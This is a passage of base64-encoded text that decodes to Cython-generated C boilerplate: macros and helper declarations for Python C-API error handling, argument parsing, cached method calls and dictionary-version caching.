iNkZWZpbmUgX19QeXhfRXJyRmV0Y2godHlwZSwgdmFsdWUsIHRiKSAgICBfX1B5eF9FcnJGZXRjaEluU3RhdGUoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXJyRmV0Y2hJblN0YXRlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE2XG4jZGVmaW5lIF9fUHl4X1B5RXJyX1NldE5vbmUoZXhjKSAoUHlfSU5DUkVGKGV4YyksIF9fUHl4X0VyclJlc3RvcmUoKGV4YyksIE5VTEwsIE5VTEwpKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlFcnJfU2V0Tm9uZShleGMpIFB5RXJyX1NldE5vbmUoZXhjKVxuI2VuZGlmXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUVycl9DbGVhcigpIFB5RXJyX0NsZWFyKClcbiNkZWZpbmUgX19QeXhfUHlFcnJfU2V0Tm9uZShleGMpIFB5RXJyX1NldE5vbmUoZXhjKVxuI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX1Jlc3RvcmUodHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJGZXRjaFdpdGhTdGF0ZSh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9GZXRjaCh0eXBlLCB2YWx1ZSwgdGIpXG4jZGVmaW5lIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKHRzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpXG4jZGVmaW5lIF9fUHl4X0VyckZldGNoSW5TdGF0ZSh0c3RhdGUsIHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX0ZldGNoKHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9SZXN0b3JlKHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyRmV0Y2godHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfRmV0Y2godHlwZSwgdmFsdWUsIHRiKVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSk7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG8sbikgUHlPYmplY3RfR2V0QXR0cihvLG4pXG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSk7XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRCdWlsdGluTmFtZShQeU9iamVjdCAqbmFtZSk7XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TGlzdF9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3Qgbik7XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgQ1lUSE9OX01FVEhfRkFTVENBTExcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVR1cGxlX0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKTtcbiNlbmRpZlxuXG5cbiNpbmNsdWRlIDxzdHJpbmcuaD5cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlCeXRlc19FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpO1xuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKFB5T2JqZWN0KiBzMSwgUHlPYmplY3QqIHMyLCBpbnQgZXF1YWxzKTtcblxuXG4jaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAjZGVmaW5lIF9fUHl4X0FyZ1JlZl9WQVJBUkdTKGFyZ3MsIGkpIF9fUHl4X1B5U2VxdWVuY2VfSVRFTShhcmdzLCBpKVxuI2VsaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX1ZBUkFSR1MoYXJncywgaSkgX19QeXhfTmV3UmVmKF9fUHl4X1B5VHVwbGVfR0VUX0lURU0oYXJncywgaSkpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX1ZBUkFSR1MoYXJncywgaSkgX19QeXhfWE5ld1JlZihQeVR1cGxlX0dldEl0ZW0oYXJncywgaSkpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfTnVtS3dhcmdzX1ZBUkFSR1Moa3dkcykgUHlEaWN0X1NpemUoa3dkcylcbiNkZWZpbmUgX19QeXhfS3dWYWx1ZXNfVkFSQVJHUyhhcmdzLCBuYXJncykgTlVMTFxuI2RlZmluZSBfX1B5eF9HZXRLd1ZhbHVlX1ZBUkFSR1Moa3csIGt3dmFsdWVzLCBzKSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvcihrdywgcylcbiNkZWZpbmUgX19QeXhfS3dhcmdzQXNEaWN0X1ZBUkFSR1Moa3csIGt3dmFsdWVzKSBQeURpY3RfQ29weShrdylcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX0ZBU1RDQUxMKGFyZ3MsIGkpIF9fUHl4X05ld1JlZihhcmdzW2ldKVxuICAgICNkZWZpbmUgX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKGt3ZHMpIF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoa3dkcylcbiAgICAjZGVmaW5lIF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKGFyZ3MsIG5hcmdzKSAoKGFyZ3MpICsgKG5hcmdzKSlcbiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X0dldEt3VmFsdWVfRkFTVENBTEwoUHlPYmplY3QgKmt3bmFtZXMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMsIFB5T2JqZWN0ICpzKTtcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBDWVRIT05fVU5VU0VEIHN0YXRpYyBQeU9iamVjdCAqX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMKFB5T2JqZWN0ICprd25hbWVzLCBQeU9iamVjdCAqY29uc3QgKmt3dmFsdWVzKTtcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIF9fUHl4X0t3YXJnc0FzRGljdF9GQVNUQ0FMTChrdywga3d2YWx1ZXMpIF9QeVN0YWNrX0FzRGljdChrd3ZhbHVlcywga3cpXG4gICNlbmRpZlxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTCBfX1B5eF9BcmdSZWZfVkFSQVJHU1xuICAgICNkZWZpbmUgX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMIF9fUHl4X051bUt3YXJnc19WQVJBUkdTXG4gICAgI2RlZmluZSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTCBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTXG4gICAgI2RlZmluZSBfX1B5eF9HZXRLd1ZhbHVlX0ZBU1RDQUxMIF9fUHl4X0dldEt3VmFsdWVfVkFSQVJHU1xuICAgICNkZWZpbmUgX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMIF9fUHl4X0t3YXJnc0FzRGljdF9WQVJBUkdTXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfQXJnc1NsaWNlX1ZBUkFSR1MoYXJncywgc3RhcnQsIHN0b3ApIFB5VHVwbGVfR2V0U2xpY2UoYXJncywgc3RhcnQsIHN0b3ApXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgfHwgKENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUylcbiNkZWZpbmUgX19QeXhfQXJnc1NsaWNlX0ZBU1RDQUxMKGFyZ3MsIHN0YXJ0LCBzdG9wKSBfX1B5eF9QeVR1cGxlX0Zyb21BcnJheShhcmdzICsgc3RhcnQsIHN0b3AgLSBzdGFydClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0FyZ3NTbGljZV9GQVNUQ0FMTChhcmdzLCBzdGFydCwgc3RvcCkgUHlUdXBsZV9HZXRTbGljZShhcmdzLCBzdGFydCwgc3RvcClcbiNlbmRpZlxuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcihjb25zdCBjaGFyKiBmdW5jX25hbWUsIFB5T2JqZWN0KiBrd19uYW1lKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUGFyc2VLZXl3b3JkcyhcbiAgICBQeU9iamVjdCAqa3dkcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcywgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqa3dkczIsIFB5T2JqZWN0ICp2YWx1ZXNbXSxcbiAgICBQeV9zc2l6ZV90IG51bV9wb3NfYXJncywgUHlfc3NpemVfdCBudW1fa3dhcmdzLFxuICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUsXG4gICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJnc1xuKTtcblxuXG4jZGVmaW5lIF9fUHl4X0NhbGxDRnVuY3Rpb24oY2Z1bmMsIHNlbGYsIGFyZ3MpXFxcbiAgICAoKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShjZnVuYyktPmZ1bmMpKHNlbGYsIGFyZ3MpXG4jZGVmaW5lIF9fUHl4X0NhbGxDRnVuY3Rpb25XaXRoS2V5d29yZHMoY2Z1bmMsIHNlbGYsIGFyZ3MsIGt3YXJncylcXFxuICAgICgoUHlDRnVuY3Rpb25XaXRoS2V5d29yZHMpKHZvaWQoKikodm9pZCkpKGNmdW5jKS0+ZnVuYykoc2VsZiwgYXJncywga3dhcmdzKVxuI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uRmFzdChjZnVuYywgc2VsZiwgYXJncywgbmFyZ3MpXFxcbiAgICAoKF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCkodm9pZCgqKSh2b2lkKSkoUHlDRnVuY3Rpb24pKGNmdW5jKS0+ZnVuYykoc2VsZiwgYXJncywgbmFyZ3MpXG4jZGVmaW5lIF9fUHl4X0NhbGxDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzKGNmdW5jLCBzZWxmLCBhcmdzLCBuYXJncywga3duYW1lcylcXFxuICAgICgoX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzKSh2b2lkKCopKHZvaWQpKShQeUNGdW5jdGlvbikoY2Z1bmMpLT5mdW5jKShzZWxmLCBhcmdzLCBuYXJncywga3duYW1lcylcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfUFlDQUxMXG4jaWYgIUNZVEhPTl9WRUNUT1JDQUxMXG4jZGVmaW5lIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGwoZnVuYywgYXJncywgbmFyZ3MpXFxcbiAgICBfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsRGljdCgoZnVuYyksIChhcmdzKSwgKG5hcmdzKSwgTlVMTClcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncyk7XG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfQlVJTERfQVNTRVJUX0VYUFIoY29uZClcXFxuICAgIChzaXplb2YoY2hhciBbMSAtIDIqIShjb25kKV0pIC0gMSlcbiNpZm5kZWYgUHlfTUVNQkVSX1NJWkVcbiNkZWZpbmUgUHlfTUVNQkVSX1NJWkUodHlwZSwgbWVtYmVyKSBzaXplb2YoKCh0eXBlICopMCktPm1lbWJlcilcbiNlbmRpZlxuI2lmICFDWVRIT05fVkVDVE9SQ0FMTFxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDBcbiAgI2luY2x1ZGUgImZyYW1lb2JqZWN0LmgiXG4gICNkZWZpbmUgX19QeHlfUHlGcmFtZV9Jbml0aWFsaXplX09mZnNldHMoKVxuICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfR2V0TG9jYWxzcGx1cyhmcmFtZSkgICgoZnJhbWUpLT5mX2xvY2Fsc3BsdXMpXG4jZWxzZVxuICBzdGF0aWMgc2l6ZV90IF9fcHl4X3B5ZnJhbWVfbG9jYWxzcGx1c19vZmZzZXQgPSAwO1xuICAjaW5jbHVkZSAiZnJhbWVvYmplY3QuaCJcbiAgI2RlZmluZSBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0cygpXFxcbiAgICAoKHZvaWQpX19QeXhfQlVJTERfQVNTRVJUX0VYUFIoc2l6ZW9mKFB5RnJhbWVPYmplY3QpID09IG9mZnNldG9mKFB5RnJhbWVPYmplY3QsIGZfbG9jYWxzcGx1cykgKyBQeV9NRU1CRVJfU0laRShQeUZyYW1lT2JqZWN0LCBmX2xvY2Fsc3BsdXMpKSxcXFxuICAgICAodm9pZCkoX19weXhfcHlmcmFtZV9sb2NhbHNwbHVzX29mZnNldCA9ICgoc2l6ZV90KVB5RnJhbWVfVHlwZS50cF9iYXNpY3NpemUpIC0gUHlfTUVNQkVSX1NJWkUoUHlGcmFtZU9iamVjdCwgZl9sb2NhbHNwbHVzKSkpXG4gICNkZWZpbmUgX19QeXhfUHlGcmFtZV9HZXRMb2NhbHNwbHVzKGZyYW1lKVxcXG4gICAgKGFzc2VydChfX3B5eF9weWZyYW1lX2xvY2Fsc3BsdXNfb2Zmc2V0KSwgKFB5T2JqZWN0ICoqKSgoKGNoYXIgKikoZnJhbWUpKSArIF9fcHl4X3B5ZnJhbWVfbG9jYWxzcGx1c19vZmZzZXQpKVxuI2VuZGlmXG4jZW5kaWZcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnLCBQeU9iamVjdCAqa3cpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQ2FsbChmdW5jLCBhcmcsIGt3KSBQeU9iamVjdF9DYWxsKGZ1bmMsIGFyZywga3cpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKTtcbiNlbmRpZlxuXG5cbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRmFzdENhbGwoZnVuYywgYXJncywgbmFyZ3MpICBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbERpY3QoZnVuYywgYXJncywgKHNpemVfdCkobmFyZ3MpLCBOVUxMKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKiBjb25zdCphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpO1xuXG5cbnR5cGVkZWYgc3RydWN0IHtcbiAgICBQeU9iamVjdCAqdHlwZTtcbiAgICBQeU9iamVjdCAqKm1ldGhvZF9uYW1lO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmIENZVEhPTl9BVE9NSUNTXG4gICAgX19weXhfYXRvbWljX2ludF90eXBlIGluaXRpYWxpemVkO1xuI2VuZGlmXG4gICAgUHlDRnVuY3Rpb24gZnVuYztcbiAgICBQeU9iamVjdCAqbWV0aG9kO1xuICAgIGludCBmbGFnO1xufSBfX1B5eF9DYWNoZWRDRnVuY3Rpb247XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fR2V0QW5kU2V0SW5pdGlhbGl6aW5nKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMpIHtcbiNpZiAhQ1lUSE9OX0FUT01JQ1NcbiAgICByZXR1cm4gMTtcbiNlbHNlXG4gICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGV4cGVjdGVkID0gMDtcbiAgICBpZiAoX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoJmNmdW5jLT5pbml0aWFsaXplZCwgJmV4cGVjdGVkLCAxKSkge1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIGV4cGVjdGVkO1xuI2VuZGlmXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9TZXRGaW5pc2hlZEluaXRpYWxpemluZyhfX1B5eF9DYWNoZWRDRnVuY3Rpb24gKmNmdW5jKSB7XG4jaWYgQ1lUSE9OX0FUT01JQ1NcbiAgICBfX3B5eF9hdG9taWNfc3RvcmUoJmNmdW5jLT5pbml0aWFsaXplZCwgMik7XG4jZW5kaWZcbn1cbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoY2Z1bmMpIDJcbiNkZWZpbmUgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX1NldEZpbmlzaGVkSW5pdGlhbGl6aW5nKGNmdW5jKVxuI2VuZGlmXG5cblxuQ1lUSE9OX1VOVVNFRFxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIGNmdW5jLCBQeU9iamVjdCogc2VsZiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnMSwgUHlPYmplY3QgKmFyZzIpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQ2FsbFVuYm91bmRDTWV0aG9kMihjZnVuYywgc2VsZiwgYXJnMSwgYXJnMikgIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKGNmdW5jLCBzZWxmLCBhcmcxLCBhcmcyKVxuI2VuZGlmXG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoY29uc3QgY2hhciogZnVuY19uYW1lLCBpbnQgZXhhY3QsXG4gICAgUHlfc3NpemVfdCBudW1fbWluLCBQeV9zc2l6ZV90IG51bV9tYXgsIFB5X3NzaXplX3QgbnVtX2ZvdW5kKTtcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKGNvbnN0IGNoYXIgKnZhcm5hbWUpO1xuXG5cbiNpZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0xpc3RDb21wX0FwcGVuZChQeU9iamVjdCogbGlzdCwgUHlPYmplY3QqIHgpIHtcbiAgICBQeUxpc3RPYmplY3QqIEwgPSAoUHlMaXN0T2JqZWN0KikgbGlzdDtcbiAgICBQeV9zc2l6ZV90IGxlbiA9IFB5X1NJWkUobGlzdCk7XG4gICAgaWYgKGxpa2VseShMLT5hbGxvY2F0ZWQgPiBsZW4pKSB7XG4gICAgICAgIFB5X0lOQ1JFRih4KTtcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgICAgIEwtPm9iX2l0ZW1bbGVuXSA9IHg7XG4gICAgICAgICNlbHNlXG4gICAgICAgIFB5TGlzdF9TRVRfSVRFTShsaXN0LCBsZW4sIHgpO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgX19QeXhfU0VUX1NJWkUobGlzdCwgbGVuICsgMSk7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICByZXR1cm4gUHlMaXN0X0FwcGVuZChsaXN0LCB4KTtcbn1cbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0xpc3RDb21wX0FwcGVuZChMLHgpIFB5TGlzdF9BcHBlbmQoTCx4KVxuI2VuZGlmXG5cblxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKG9iailcXFxuICAgIChsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3Qob2JqKSkgPyBfX1B5eF9OZXdSZWYob2JqKSA6IFB5T2JqZWN0X1N0cihvYmopKVxuXG5cbiNpZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4jZGVmaW5lIF9fUFlYX0RJQ1RfVkVSU0lPTl9JTklUICAoKFBZX1VJTlQ2NF9UKSAtMSlcbiNkZWZpbmUgX19QWVhfR0VUX0RJQ1RfVkVSU0lPTihkaWN0KSAgKCgoUHlEaWN0T2JqZWN0KikoZGljdCkpLT5tYV92ZXJzaW9uX3RhZylcbiNkZWZpbmUgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoZGljdCwgdmFsdWUsIGNhY2hlX3ZhciwgdmVyc2lvbl92YXIpXFxcbiAgICAodmVyc2lvbl92YXIpID0gX19QWVhfR0VUX0RJQ1RfVkVSU0lPTihkaWN0KTtcXFxuICAgIChjYWNoZV92YXIpID0gKHZhbHVlKTtcbiNkZWZpbmUgX19QWVhfUFlfRElDVF9MT09LVVBfSUZfTU9ESUZJRUQoVkFSLCBESUNULCBMT09LVVApIHtcXFxuICAgIHN0YXRpYyBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb24gPSAwO1xcXG4gICAgc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSA9IE5VTEw7XFxcbiAgICBpZiAobGlrZWx5KF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oRElDVCkgPT0gX19weXhfZGljdF92ZXJzaW9uKSkge1xcXG4gICAgICAgIChWQVIpID0gX19weXhfZGljdF9jYWNoZWRfdmFsdWU7XFxcbiAgICB9IGVsc2Uge1xcXG4gICAgICAgIChWQVIpID0gX19weXhfZGljdF9jYWNoZWRfdmFsdWUgPSAoTE9PS1VQKTtcXFxuICAgICAgICBfX3B5eF9kaWN0X3ZlcnNpb24gPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKERJQ1QpO1xcXG4gICAgfVxcXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfdHBfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUFlfVUlOVDY0X1QgX19QeXhfZ2V0X29iamVjdF9kaWN0X3ZlcnNpb24oUHlPYmplY3QgKm9iaik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfb2JqZWN0X2RpY3RfdmVyc2lvbl9tYXRjaGVzKFB5T2JqZWN0KiBvYmosIFBZX1VJTlQ2NF9UIHRwX2RpY3RfdmVyc2lvbiwgUFlfVUlOVDY0X1Qgb2JqX2RpY3RfdmVyc2lvbik7XG4jZWxzZVxuI2RlZmluZSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpICAoMClcbiNkZWZpbmUgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoZGljdCwgdmFsdWUsIGNhY2hlX3ZhciwgdmVyc2lvbl92YXIpXG4jZGVmaW5lIF9fUFlYX1BZX0RJQ1RfTE9PS1VQX0lGX01PRElGSUVEKFZBUiwgRElDVCwgTE9PS1VQKSAgKFZBUikgPSAoTE9PS1VQKTtcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlNcbiNkZWZpbmUgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZSh2YXIsIG5hbWUpICBkbyB7XFxcbiAgICBzdGF0aWMgUFlfVUlOVDY0X1QgX19weXhfZGljdF92ZXJzaW9uID0gMDtcXFxuICAgIHN0YXRpYyBQeU9iamVjdCAqX19weXhfZGljdF9jYWNoZWRfdmFsdWUgPSBOVUxMO1xcXG4gICAgKHZhcikgPSAobGlrZWx5KF9fcHl4X2RpY3RfdmVyc2lvbiA9PSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QpKSkgP1xcXG4gICAgICAgIChsaWtlbHkoX19weXhfZGljdF9jYWNoZWRfdmFsdWUpID8gX19QeXhfTmV3UmVmKF9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlKSA6IF9fUHl4X0dldEJ1aWx0aW5OYW1lKG5hbWUpKSA6XFxcbiAgICAgICAgX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUobmFtZSwgJl9fcHl4X2RpY3RfdmVyc2lvbiwgJl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlKTtcXFxufSB3aGlsZSgwKVxuI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lVW5jYWNoZWQodmFyLCBuYW1lKSAgZG8ge1xcXG4gICAgUFlfVUlOVDY0X1QgX19weXhfZGljdF92ZXJzaW9uO1xcXG4gICAgUHlPYmplY3QgKl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlO1xcXG4gICAgKHZhcikgPSBfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShuYW1lLCAmX19weXhfZGljdF92ZXJzaW9uLCAmX19weXhfZGljdF9jYWNoZWRfdmFsdWUpO1xcXG59IHdoaWxlKDApXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKFB5T2JqZWN0ICpuYW1lLCBQWV9VSU5UNjRfVCAqZGljdF92ZXJzaW9uLCBQeU9iamVjdCAqKmRpY3RfY2FjaGVkX3ZhbHVlKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUodmFyLCBuYW1lKSAgKHZhcikgPSBfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShuYW1lKVxuI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lVW5jYWNoZWQodmFyLCBuYW1lKSAgKHZhcikgPSBfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShuYW1lKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOY